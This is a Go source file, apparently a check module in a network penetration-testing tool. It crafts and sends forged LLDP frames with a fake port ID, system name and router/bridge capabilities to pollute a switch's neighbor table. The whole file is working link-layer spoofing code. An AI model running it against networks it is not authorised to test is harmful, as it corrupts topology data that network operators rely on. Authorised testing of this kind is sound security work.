// lldpspoof.go implements the generic LLDP spoofing check. Impact
// temporary, restore decay with no stated bound, affects device: the
// spoofed LLDP frames with false chassis, port, and system information
// enter the switch's neighbor table, and the entry expires with the
// holdtime the frame carries.
//
// The baseline does not carry a generic LLDP spoofing attack. The craft
// is authored from IEEE 802.1AB.

package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type lldpSpoofFinding struct {
	Action string `json:"action"`
	TTL    uint16 `json:"ttl"`
	Count  int    `json:"count"`
}

// RunLLDPSpoof sends two LLDP frames from the attack leg's MAC with a
// false port ID, system name, and capabilities. All three are probe
// content, so the behavior reads no target. The verdict is pending and the
// behavior reads no frame: the neighbor table the frames enter is readable
// only over management, and nothing on the wire shows the entry.
func RunLLDPSpoof(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	src := deps.AttackLeg.Addr().MAC
	ttl := uint16(120)
	count := 2

	pkt, err := craftLLDPSpoof(src, ttl)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "lldpspoof: craft frame")
	}

	for range count {
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return check.Verdict{}, errs.Wrap(err, "lldpspoof: send frame")
		}
	}

	detail, _ := json.Marshal(lldpSpoofFinding{
		Action: "lldp-spoof",
		TTL:    ttl,
		Count:  count,
	})
	deps.Emitter.Finding("lldp", detail)

	return check.Pending("the neighbor table is readable only over management"), nil
}

// craftLLDPSpoof builds an LLDP frame with spoofed chassis/port/TTL.
func craftLLDPSpoof(src net.HardwareAddr, ttl uint16) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       lldpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeLinkLayerDiscovery,
	}
	lldp := &layers.LinkLayerDiscovery{
		ChassisID: layers.LLDPChassisID{
			Subtype: layers.LLDPChassisIDSubTypeMACAddr,
			ID:      src,
		},
		PortID: layers.LLDPPortID{
			Subtype: layers.LLDPPortIDSubtypeIfaceName,
			ID:      []byte("Gi0/1"),
		},
		TTL: ttl,
		Values: []layers.LinkLayerDiscoveryValue{
			{
				Type:   layers.LLDPTLVSysName,
				Length: 11,
				Value:  []byte("spoofed-sw1"),
			},
			{
				Type:   layers.LLDPTLVSysCapabilities,
				Length: 4,
				Value:  []byte{0x00, 0x14, 0x00, 0x14}, // router + bridge
			},
		},
	}
	return craft.Default(eth, lldp)
}
